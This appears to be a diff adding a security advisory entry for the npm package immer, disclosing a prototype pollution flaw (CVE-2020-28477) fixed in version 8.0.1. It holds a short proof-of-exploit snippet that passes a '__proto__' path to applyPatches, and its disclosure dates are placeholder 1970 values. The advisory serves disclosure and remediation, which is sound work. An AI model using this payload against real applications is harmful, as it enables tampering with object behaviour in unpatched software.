@@ -1,0 +1,35 @@
+---
+- id: npmjs:npm:immer:1603
+  title: Prototype Pollution
+  description: |-
+    ## Overview
+
+    Affected versions of `immer` are vulnerable to Prototype Pollution.
+
+    ## Proof of exploit
+
+    ```
+    const {applyPatches, enablePatches} = require("immer");
+    enablePatches();
+    let obj = {};
+    console.log("Before : " + obj.polluted);
+    applyPatches({}, [ { op: 'add', path: [ "__proto__", "polluted" ], value: "yes" } ]);
+    // applyPatches({}, [ { op: 'replace', path: [ "__proto__", "polluted" ], value: "yes" } ]);
+    console.log("After : " + obj.polluted);
+    ```
+
+    ## Remediation
+
+    Version 8.0.1 contains a [fix](https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5) for this vulnerability, updating is recommended.
+  affected_package: immer
+  vulnerable_versions:
+  - "<8.0.1"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2020-28477
+  cwe: CWE-1321
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Anonymous
